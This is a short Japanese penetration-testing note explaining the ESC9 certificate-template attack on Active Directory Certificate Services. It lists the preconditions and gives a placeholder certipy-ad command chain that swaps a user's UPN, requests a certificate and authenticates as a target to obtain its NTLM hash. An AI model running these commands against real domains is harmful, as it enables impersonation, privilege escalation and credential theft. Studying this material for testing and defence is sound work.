# No Security Extension (ESC9) 攻撃

No Security Extension (ESC9) 攻撃は、`CT_FLAG_NO_SECURITY_EXTENSION` フラグが設定された脆弱な証明書テンプレートを悪用する攻撃。このフラグは、証明書に `szOID_NTDS_CA_SECURITY_EXT セキュリティ拡張機能`が埋め込まれるのを防ぐ。ユーザー アカウントに対する `GenericWrite` 権限を持つユーザーは、`userPrincipalName` を変更して、管理者などのターゲットアカウントになりすまし、脆弱なテンプレートから証明書を要求することができる。発行された証明書は、ターゲットアカウントとして認証するために使用できる。

## ESC9 前提条件

- `StrongCertificateBindingEnforcement` が `2`に設定されていないか(デフォルト：`1` )、または`CertificateMappingMethods`に `UPN` フラグ (`0x4` ) が含まれている
- テンプレートの、`msPKI-Enrollment-Flag`の値に`CT_FLAG_NO_SECURITY_EXTENSION`フラグが含まれている
- テンプレートはクライアント認証を指定している
- アカウントAに対して、アカウントBを侵害する`GenericWrite`権限を持っている

## ESC9 の悪用

このシナリオでは、user1 は user2 に対して `GenericWrite` 権限を持っており、user3 を侵害しようとしています。user2 は、`msPKI-Enrollment-Flag` 値に `CT_FLAG_NO_SECURITY_EXTENSION` フラグを指定する脆弱なテンプレートに登録できる。 まず、`user2 のNTLMハッシュが必要`になる。これは、たとえば Shadow Credentials 攻撃によって取得するか、認諸情報を持っている場合は [NTLM Hash Generator](https://codebeautify.org/ntlm-hash-generator) で変換できる。

```
certipy-ad shadow auto -u <USER1>@<DOMAIN> -p <PASSWORD> -account <USER2>
```

user2 の `userPrincipalName` を user3 に変更

```
certipy-ad account update -u <USER1>@<DOMAIN> -p <PASSWORD> -user <USER2> -upn <USER3>
```

脆弱な証明書を user2として要求する

```
certipy-ad req -u <USER2>@<DOMAIN> -p <PASSWORD> -ca "<CA_NAME>" -template <Vulnerable Template>
```

user2 の `userPrincipalName` を別のものに変更

```
certipy-ad account update -u <USER1>@<DOMAIN> -p <PASSWORD> -user <USER2> -upn <USER2>@<DOMAIN>
```

証明書を使って認証を行いuser3のNTLMハッシュを取得する

```
certipy-ad auth -pfx user3.pfx -domain <DOMAIN>
```



